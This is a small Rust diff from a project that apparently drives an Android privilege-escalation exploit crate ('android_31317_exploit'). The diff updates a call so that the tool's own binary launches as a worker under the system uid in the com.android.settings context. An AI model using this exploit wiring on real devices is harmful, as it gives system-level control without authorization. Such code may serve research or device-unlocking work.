@@ -1,6 +1,6 @@
 use std::{io::ErrorKind, path::PathBuf, thread::sleep, time::Duration};
 
-use android_31317_exploit::exploit::{ExploitKind, execute};
+use android_31317_exploit::exploit::{ExploitKind, build_and_execute};
 
 use crate::{error::Error, protocol::DataFrame, socket::connect_worker};
 
@@ -42,12 +42,12 @@ impl Controller {
 }
 
 fn start_worker(executable: PathBuf) -> Result<(), Error> {
-    Ok(execute(
+    Ok(build_and_execute(
         1000,
         "/data/",
         "com.android.settings",
         "platform:system_app:targetSdkVersion=29:complete",
-        ExploitKind::Command(format!("{} worker", executable.display())),
+        &ExploitKind::Command(format!("{} worker", executable.display())),
         None,
     )?)
 }
